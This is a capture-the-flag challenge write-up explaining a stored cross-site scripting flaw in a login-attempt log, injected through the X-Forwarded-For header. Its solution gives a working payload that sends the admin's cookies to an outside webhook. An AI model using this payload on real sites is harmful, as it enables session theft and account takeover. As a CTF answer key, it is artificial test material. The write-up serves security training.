Description:
  The 'admin' is quite paranoid and he often checks whether someone is trying to access with his credentials on its website.

Explanation:
  The challenge is based on Cross-Site Scripting vulnerability.
  After register a new use and login, it is possible to view whether there has been some login attempts with wrong credentials.
  It's shown the source IP and the timestamp of the attempt in case of.
  By including the standard HTTP header to identify the origin IP (X-Forwarded-For), it is possible to change the source IP shown in the page.
  The server does not validate input on this header and it is vulnerable to XSS, thus by writing JS code in the header, the browser will execute it.

  Example:
  curl 'http://localhost:5000/login' -H 'X-Forwarded-For: <script>alert(1)</script>' --data 'username=test&password=wrong_password'
  By trying to login as 'test' user with wrong password and JS code in the header, the next time the user correctly login will see the alert popup

Write-up:
  The flag is stored inside cookies of the 'admin' user (as well as his session which can be used to login as 'admin').
  We have a bot which login as 'admin' every second in order to execute the injected JS code.
  In order to retrieve the flag, we have to inject code to send to a webhook server (i.e. free services like https://webhook.site/) the cookies of the user.

  Solution example:
  X-Forwarded-For: '<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "https://webhook.site/02a161bb-5d64-4827-aaab-880654b0eccb"); xhr.send(document.cookie);</script> 
